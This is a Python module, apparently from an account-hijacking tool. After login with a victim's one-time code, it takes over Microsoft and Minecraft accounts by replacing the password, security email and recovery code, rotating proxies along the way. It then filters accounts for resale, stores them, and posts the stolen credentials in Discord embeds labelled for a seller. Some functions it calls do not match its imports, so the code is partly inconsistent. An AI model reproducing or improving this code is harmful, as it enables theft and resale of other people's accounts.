from authsecuring.utils.cookies.get_livedata import livedata
from authsecuring.embed_builder import (
    add_cred_line_field,
    assemble_account_embeds,
    make_failure_embed,
    public_decline_reason,
)
from authsecuring.auth.polish_host import polish_host
from authsecuring.auth.get_msaauth import get_msaauth
from authsecuring.auth.initial_session import get_session, clone_session_new_proxy
from authsecuring.utils.secure import secure
from authsecuring.filters import rejection_reason
from authsecuring.banwatch import apply_ban_checks
from authsecuring.utils.proxy import (
    close_session,
    format_exception_reason,
    is_proxy_transport_error,
    run_with_proxy_retry,
)

from storage.romeo_db import RomeoDB as DBConnection
from discord import Embed
import asyncio
import httpx
import uuid
import time
import logging


def _decline(email: str, reason: str, account: dict, *, creds_changed: bool) -> dict:
    ms = (account or {}).get("microsoft") or {}
    mc = (account or {}).get("minecraft") or {}
    sec_email = str(ms.get("security_email") or "").strip()
    pwd = str(ms.get("password") or "").strip()
    rec_code = str(ms.get("recovery_code") or "").strip()
    original = str(ms.get("original_email") or email or "").strip() or email
    primary = str(ms.get("email") or "").strip() or original
    replaced = ms.get("primary_alias_replaced")
    if replaced is None and primary.lower() != original.lower():
        replaced = True

    sentinel_values = {"Couldn't Change!", "Unknown", "N/A", "?"}
    has_creds = bool(replaced is True) or any(
        v and v not in sentinel_values and "Couldn't Change" not in v
        for v in [sec_email, pwd, rec_code]
    )

    if has_creds:
        creds_changed = True

    detail = str(ms.get("recover_error") or reason or "").strip() or reason

    ms_summary = {
        "email": primary,
        "original_email": original,
        "security_email": sec_email or "Couldn't Change!",
        "password": pwd or "Couldn't Change!",
        "recovery_code": rec_code or "Couldn't Change!",
        "username": mc.get("name"),
        "primary_alias_replaced": replaced,
    }

    fail_embed = make_failure_embed(
        original,
        ms_summary,
        reason,
        error=detail,
        credentials_changed=creds_changed,
    )

    return {
        "failed": True,
        "reason": public_decline_reason(reason),
        "error": public_decline_reason(detail),
        "microsoft": {**ms, **ms_summary},
        "minecraft": mc,
        "credentials_changed": creds_changed,
        "hit_embed": fail_embed,
        "seller_embed": fail_embed,
    }


def _trace(msg: str) -> None:
    print(msg, flush=True)
    logging.info(msg)


async def startSecuringAccount(session: httpx.AsyncClient, email, device=None,
                               code=None, recovery=True, ppft=None, rextra=None,
                               command=False, embed_verify: bool = False):
    account = {
        "microsoft": {
            "email": email or "Couldn't Change!",
            "security_email": "Couldn't Change!",
            "password": "Couldn't Change!",
            "recovery_code": "Couldn't Change!",
            "auth_secret": "Disabled",
            "firstName": "Failed to Get",
            "lastName": "Failed to Get",
            "fullName": "Failed to Get",
            "region": "Failed to Get",
            "birthday": "Failed to Get",
            "language": "Failed to Get",
            "family": [],
            "devices": [],
            "cards": [],
            "subscriptions": {"active": [], "canceled": [], "commercial": []},
            "phones": [],
        },
        "minecraft": {
            "name": "No Minecraft",
            "method": "Not purchased",
            "gamertag": "Not Found",
            "uchange": "0 Days",
            "capes": "No capes",
            "SSID": False,
        }
    }

    async def _attempt_login(client: httpx.AsyncClient):
        _trace("[~] — resolving Microsoft login (canary)...")
        live = await canary_data(client)
        _trace("[~] — submitting Microsoft login (OTP / authenticator)...")
        return await acquire_msaauth(client, email, device, live, code, ppft)

    try:
        msaauth, session = await run_with_proxy_retry(
            session,
            _attempt_login,
            new_session=get_session,
            attempts=4,
            rotate_ssid_after=1,
            label="livedata-login",
            email=email,
        )
    except Exception as exc:
        logging.exception("livedata/login failed for %s", email)
        detail = format_exception_reason(exc)
        if is_proxy_transport_error(exc):
            detail = (
                f"Proxy/network failed while opening Microsoft login ({detail}). "
                "The OTP may still be valid — try Submit Code again."
            )
        return _decline(email, detail, account, creds_changed=False)

    started_at = time.time()

    if isinstance(msaauth, dict) and msaauth.get("_error"):
        return _decline(email, str(msaauth["_error"]), account, creds_changed=False)

    if not msaauth:
        return _decline(email,
            "Login failed — no MSAAUTH session. The OTP may be wrong or expired.",
            account, creds_changed=False)

    if rextra:
        account["microsoft"]["password"] = rextra["password"]
        account["microsoft"]["security_email"] = rextra["security_email"]
        account["microsoft"]["recovery_code"] = rextra["recovery_code"]

    if embed_verify and msaauth == "Family":
        print("[!] — Embed verify: Family interrupt ignored — continuing cookies-only")
        logging.warning("embed verify ignoring Family login interrupt for %s", email)
        msaauth = {"_cookies_only": True}

    match msaauth:
        case "Recovery":
            print(f"[X] — Account requires account recovery")
            return _decline(email, "Account requires Microsoft account recovery.",
                          account, creds_changed=False)

        case "Family":
            print(f"[X] — Account is Family Locked")
            return _decline(email, "Account is Family Locked (child/parental).",
                          account, creds_changed=False)

        case _:
            print("[+] — Acquired MSAAUTH")
            try:
                await polish_host(session, msaauth)
            except Exception:
                logging.exception("polish_host failed — continuing with existing cookies")
                print("[!] — polish_session raised; continuing with existing cookies")

            _trace("[~] — Polish complete")

            secure_attempts = 4
            last_exc: BaseException | None = None
            for attempt in range(1, secure_attempts + 1):
                try:
                    account = await secure(
                        session=session,
                        recovery=recovery,
                        account_info=account,
                        command=command,
                        embed_verify=embed_verify,
                    )
                    last_exc = None
                    break
                except Exception as exc:
                    last_exc = exc
                    if is_proxy_transport_error(exc) and attempt < secure_attempts:
                        logging.warning(
                            "process_account %s for %s (attempt %s/%s) — new sticky proxy",
                            exc.__class__.__name__, email, attempt, secure_attempts,
                        )
                        print(
                            f"[!] — process_account {format_exception_reason(exc)} "
                            f"({attempt}/{secure_attempts}) — rotating proxy…"
                        )
                        try:
                            nxt = clone_session_new_proxy(session)
                        except Exception:
                            logging.exception("clone_session_with_proxy failed")
                            nxt = None
                        if nxt is not None:
                            await close_session(session)
                            session = nxt
                        await asyncio.sleep(1.5 * attempt)
                        continue
                    break

            if last_exc is not None:
                exc = last_exc
                logging.exception("process_account crashed after login for %s", email)
                detail = format_exception_reason(exc)
                print(f"[X] — process_account crashed: {detail}")

                if not isinstance(account, dict):
                    raise

                account.setdefault("microsoft", {})
                ms = account["microsoft"]
                if not ms.get("recover_error"):
                    ms["recover_error"] = detail

                changed = bool(rextra) or (
                    ms.get("primary_alias_replaced") is True
                    or (
                        str(ms.get("password") or "")
                        not in ("", "Couldn't Change!", "Unknown")
                        and "UNVERIFIED" not in str(ms.get("password") or "")
                    )
                )

                if is_proxy_transport_error(exc):
                    amc_hit = "get_amc" in str(exc).lower() or "account.microsoft.com" in str(exc).lower()
                    if amc_hit and not changed:
                        why = (
                            f"Microsoft account portal unreachable ({detail}). "
                            "Login worked; password and email were not changed. "
                            "Submit the OTP again."
                        )
                    else:
                        why = (
                            f"Securing step failed: {detail}. "
                            "Network/proxy timed out after login — credentials above "
                            "may already have changed; retry securing."
                        )
                else:
                    why = f"Securing step failed: {detail}"

                return _decline(email, why, account, creds_changed=changed)

    creds_changed = bool(rextra) or (
        str((account.get("microsoft") or {}).get("password") or "")
        not in ("", "Couldn't Change!", "Unknown")
        and "UNVERIFIED" not in str((account.get("microsoft") or {}).get("password") or "")
    )

    if rextra:
        creds_changed = True
    if (account.get("microsoft") or {}).get("primary_alias_replaced") is True:
        creds_changed = True

    from authsecuring.filters import is_embed_verify_no_minecraft

    if embed_verify and (
        account.get("embed_no_minecraft") or is_embed_verify_no_minecraft(account)
    ):
        print("[!] — Embed verify: no Minecraft Java — skipping hit / roles")
        logging.info("embed verify no Minecraft Java for %s", email)
        account["embed_no_minecraft"] = True
        return account

    if embed_verify:
        skipped = rejection_reason(account)
        if skipped:
            print(f"[~] — Embed verify: ignoring autobuy reject ({skipped})")
            logging.info("embed verify skipping reject for %s: %s", email, skipped)

        ban_skip = await apply_ban_checks(account)
        if ban_skip:
            print(f"[~] — Embed verify: ignoring ban check ({ban_skip})")
            logging.info("embed verify skipping ban for %s: %s", email, ban_skip)
    else:
        reject = rejection_reason(account)
        if reject:
            print(f"[X] — Rejected account: {reject}")
            logging.warning("Rejected secured account %s: %s", email, reject)
            return _decline(email, reject, account, creds_changed=creds_changed)

        ban_reject = await apply_ban_checks(account)
        if ban_reject:
            print(f"[X] — Banned account: {ban_reject}")
            logging.warning("Ban-check rejected %s: %s", email, ban_reject)
            return _decline(email, ban_reject, account, creds_changed=creds_changed)

    elapsed = (time.time() - started_at)

    account_id = uuid.uuid4().hex
    with DBConnection() as db:
        db.add_secured_account(account_id, account)

    try:
        return await assemble_account_embeds(account, elapsed, account_id)
    except Exception as exc:
        logging.exception("assemble_account_embeds failed after securing")
        ms = account["microsoft"]
        fallback = Embed(
            title=f"Secured in {round(elapsed, 2)}s (embed partial)",
            description=f"Account secured but detail embed failed: `{exc.__class__.__name__}: {exc}`",
            color=0x279CF5,
        )
        fallback.add_field(name="Primary Email", value=f"```{ms.get('email', 'Unknown')}```", inline=False)
        fallback.add_field(name="Security Email", value=f"```{ms.get('security_email', 'Unknown')}```", inline=True)
        fallback.add_field(name="Password", value=f"```{ms.get('password', 'Unknown')}```", inline=True)
        fallback.add_field(name="Recovery Code", value=f"```{ms.get('recovery_code', 'Unknown')}```", inline=False)
        fallback.add_field(name="MC Username", value=f"```{account['minecraft'].get('name', 'Unknown')}```", inline=False)
        add_cred_line_field(
            fallback,
            email=ms.get("email", ""),
            recovery=ms.get("recovery_code", ""),
            password=ms.get("password", ""),
            security_email=ms.get("security_email", ""),
            username=account["minecraft"].get("name", ""),
        )
        return {
            "hit_embed": fallback,
            "account_id": account_id,
            "minecraft": account["minecraft"],
            "details": {
                "stats_embed": fallback,
                "ssid_embed": fallback,
                "info_embed": fallback,
                "xbox_embed": fallback,
                "family_embed": fallback,
                "devices_embed": fallback,
                "cards_embed": fallback,
                "subs_embed": fallback,
                "phones_embed": fallback,
                "account_details": (
                    f"**Username:** {account['minecraft'].get('name', 'Unknown')}\n"
                    f"**Email:** {ms.get('email', 'Unknown')}\n"
                    f"**Security Email:** {ms.get('security_email', 'Unknown')}\n"
                    f"**Password:** {ms.get('password', 'Unknown')}\n"
                    f"**Recovery Code:** {ms.get('recovery_code', 'Unknown')}"
                ),
            },
        }
